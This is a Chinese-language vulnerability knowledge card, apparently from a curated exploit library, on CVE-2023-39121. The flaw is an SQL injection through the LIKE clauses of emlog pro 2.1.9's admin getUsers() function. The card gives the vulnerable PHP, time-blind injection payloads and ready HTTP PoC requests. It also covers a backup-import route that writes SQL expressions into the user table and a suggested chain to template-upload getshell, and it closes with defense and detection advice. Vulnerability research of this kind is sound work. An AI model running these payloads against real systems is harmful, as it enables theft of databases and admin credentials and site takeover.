---
id: web-generic-sqli-emlog-admin-getusers-like-concat
title: emlog pro 后台 user.php getUsers() LIKE 拼接 SQL 注入（CVE-2023-39121）
type: scenario
domain: web
path: web/generic/sqli
technique: emlog-admin-getusers-like-concat-sqli
aliases:
- emlog SQL 注入
- CVE-2023-39121
- CNVD-2023-65138
- getUsers nickname email like 注入
- emlog pro 2.1.9 注入
tags:
- sqli
- php
- emlog
- cms
- like-injection
- admin
- mysql
- time-blind
cve:
- CVE-2023-39121
severity: medium
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-12'
affected_versions: emlog 2.1.9（原文审计版本；CNVD-2023-65138 标注影响 emlog 2.1.9）
verification:
  verified_by: verifier-V557
  verified_at: '2026-11-12T00:32:38+08:00'
  notes: 已对照原文与10张截图核对：图06 getUsers 的 email like '$email%' 与 nickname like '%$nickname%' 直接拼接进 SELECT，图07 addUser 中 nickname=getRandStr(8,false)，图08 备份 SQL 的 nickname 列写入不带引号的 (select database())（INSERT 时求值），图09 导入备份，图10 用户列表回显 obs_db——均与卡片一致；CVE-2023-39121 / CNVD-2023-65138 / emlog 2.1.9 与图05一致。修正内容（staging 与库内卡同步）：1) 原文未给直接 HTTP 请求，卡片按代码构造的时间盲注原用 nickname OR 型（like '%' 前缀恒真会被短路），已改为 AND 型使得 if(...sleep...) 参与求值，并说明 email 前缀 like '' 恒假可用 OR；2) SQL 导入示例的 (select database()) 原误加引号，按图08 改为不加引号并补列顺序说明。跳过核对：上传小节（标题 CVE-2023-44974，图01 实为 CNVD-2023-74536/CVE-2023-44973/emlog pro 2.2.0）与既有 verified 卡 web-generic-file-upload-emlog-template-zip-header-php-rce 同为 admin/template.php upload_zip + emUnZip('tpl') 只校验 header.php 后解压到 content/templates/，同链，worker 跳过正确。dedup 仅命中自身，其余候选（Cynthia 用户列表、PHPGurukul、SeaCMS、DocSys、JFinal whereLike 等）为不同产品/不同 sink，非同链，保留。affected_versions 原文明确 emlog pro 2.1.9 已设置；所有 PoC 未在本机执行。
---

## 一句话结论

emlog pro 2.1.9 后台 `admin/user.php` 的用户查询最终落到模型层 `getUsers($email, $nickname, $page)`，该函数把 `$email`、`$nickname` 直接拼进 `LIKE` 子句（`email like '$email%'`、`nickname like '%$nickname%'`）再执行 `SELECT ... where 1=1 $condition order by uid desc $limit`；持有后台会话的攻击者通过用户搜索参数闭合引号即可注入，原文还演示了借助后台「数据库备份导入」把 `(select database())` 写进用户 `nickname` 列、在用户列表回显库名的复现路径。

## 原理

- 脆弱代码（模型层 `getUsers`）：
  ```php
  if ($email)    { $condition = " and email like '$email%'"; }
  if ($nickname) { $condition = " and nickname like '%$nickname%'"; }
  $res = $this->db->query("SELECT * FROM ".DB_PREFIX."user where 1=1 $condition order by uid desc $limit");
  ```
  `$email`、`$nickname` 无任何转义/参数化，直接进入 SQL 文本。
- LIKE 场景的注入形态与短路：`$email` 的模板是 `like '$email%'`，`$nickname` 是 `like '%$nickname%'`。闭合引号时要注意 MySQL 对 `OR`/`AND` 的短路求值：
  - `email` 拼接后的前缀是 `like ''`（对非空 email 恒假），`email=' or if(ascii(substr(database(),1,1))=111,sleep(2),0) or '` 会让 `if` 继续参与求值，可作时间盲注。
  - `nickname` 拼接后的前缀是 `like '%'`（对非空 nickname 恒真），若用 `nickname=' or sleep(2) or '`，第一个 OR 项已为真、`sleep` 不会被求值；应改用 `AND`：`nickname=' and if(ascii(substr(database(),1,1))=111,sleep(2),0) and '`，`like '%'` 为真后继续求值 `if(...)`（末尾 `and '%'` 使整行为假，页面可能无结果但延迟已发生）。
  用响应时间判断真假，即可逐字符拖库（`sleep` 在 WHERE 中按行求值，多行时延迟会叠加）。
- 参数来源：后台用户管理页把搜索框的 email/nickname 传给 `getUsers`；原文称这两个变量「不为空时可控」，即请求中带上非空过滤参数就会进入拼接分支。
- 原文的复现路径（与直接请求参数不同）：作者先尝试在「添加用户」处控制用户名，发现用户名由服务端随机生成 8 位字符串；于是用后台「数据 → 导入备份」，把导出的 SQL 备份中某个用户的 `nickname` 列改成不带引号的 `(select database())` 再导入，MySQL 在 `INSERT` 时求值并把库名存入该列，用户列表随即显示 `obs_db`。这说明后台备份导入可以执行任意 SQL 表达式/语句并改写用户表数据；原文把该手法作为注入 payload 的落库方式，但未给出最终触发 `getUsers` 的实际 HTTP 请求。
- 为什么仍成立：`getUsers` 的字符串拼接是确定的注入 sink；直接对搜索参数注入不依赖备份导入。备份导入只是同文给出的取巧数据准备手法，且其本身需要管理员权限。
- 危害：后台 SQL 注入可读取整库（含管理员/用户口令哈希）、篡改数据；若数据库账号具备 `FILE` 权限，还可尝试 `INTO OUTFILE` 写文件，与同产品的模板上传 getshell 组合。

## 触发条件

- 目标为 emlog 2.1.9（CNVD-2023-65138 标注版本）。
- 攻击者持有有效后台管理员会话（该注入点在后台用户管理）。
- 后台用户列表的搜索/过滤参数会传入 `getUsers` 的 `$email`/`$nickname`。
- MySQL 数据库；注入表达式需符合 MySQL 语法。

## 利用步骤

1. 登录后台，确认 `/admin/user.php` 可访问用户管理。
2. 时间盲注验证：请求带 `nickname=' and sleep(2) and '`（URL 编码），观察响应是否稳定延迟；注意 nickname 模板前缀是 `like '%'`（恒真），OR 型 payload 会被短路，必须用 AND 形式。
3. 用 `nickname=' and if(ascii(substr(database(),1,1))=N,sleep(2),0) and '` 逐字符提取库名、表名、管理员口令等；email 参数因前缀 `like ''` 恒假，也可用 OR 形式；视回显改布尔/联合/报错形态。
4. （原文路线）若需要先准备特定数据：后台导出数据库备份 → 修改备份 SQL 中目标用户行的 `nickname` 为 `(select database())` 或注入 payload → 通过「数据 → 导入备份」上传 → 用户列表回显求值结果（如库名 `obs_db`）。
5. 视数据库权限尝试写文件或结合同产品后台模板上传 getshell。

## PoC

```http
GET /admin/user.php?nickname=%27%20and%20sleep(2)%20and%20%27 HTTP/1.1
Host: target
Cookie: <emlog 管理员会话>
```

```http
GET /admin/user.php?nickname=%27%20and%20if(ascii(substr(database(),1,1))%3D111,sleep(2),0)%20and%20%27 HTTP/1.1
Host: target
Cookie: <emlog 管理员会话>
```

```text
# nickname 模板为 like '%<输入>%'，首个 OR 项恒真，故用 AND 形式让 if(...sleep...) 参与求值；
# 条件为真（库名首字母 ascii=111 'o'）时每行 sleep(2)，响应延迟约 2 秒×行数；
# 条件为假时立即返回。email 参数前缀 like '' 恒假，可改用 OR 形式。
```

```sql
-- 原文备份导入路线：编辑导出的 SQL 备份后通过后台「导入备份」执行
-- 列顺序：uid, username, password, nickname, role, ...；子查询不加引号才会在 INSERT 时求值
INSERT INTO `emlog_user` VALUES ('112','',$PBKX...,(select database()),'writer','n','','admin@qq.com',...);
-- 导入后该用户 nickname 变为库名（原文为 obs_db），用户列表显示该值
```

## 变体与关联

- 关联：[[web-generic-file-upload-emlog-template-zip-header-php-rce]]（同产品后台模板 ZIP 上传 getshell；两者都要求管理员会话，可组合成「注入拿凭据/数据 → 上传写马」）。
- 变体：`$limit`/`$condition` 之外的参数同样来自拼接；若 `$page` 可被非整数化，还可能叠加 LIMIT 注入。
- 变体：备份导入本身等价于任意 SQL 执行（管理员功能），可用于改管理员口令、写入 payload 数据，但不应与 getUsers 注入混为一谈。
- 边界：原文未给出直接触发 `getUsers` 的最终 HTTP 请求，本卡的直接请求 PoC 依据代码结构构造，置信度 medium；实际测试需按目标版本的 `admin/user.php` 参数名调整。

## 检测与防御

- 根治：`getUsers` 改用预处理/参数化查询，`LIKE` 的通配符与用户输入分离，`%` 由代码拼接而非用户输入；`$page`、`$limit` 强制整型化。
- 加固：后台用户搜索对引号、`or`、`sleep`、子查询等特征做校验；数据库账号最小权限（去掉 FILE）；管理员强制强口令与登录二次验证。
- 检测：`/admin/user.php` 请求参数中出现 `'`、`or`、`sleep`、`if(`、`substr(database()` 等特征；后台异常慢查询；`INTO OUTFILE` 相关日志。
- 检测：后台备份导入功能的使用审计（谁在何时导入了被修改的 SQL 备份），备份文件哈希与来源校验。
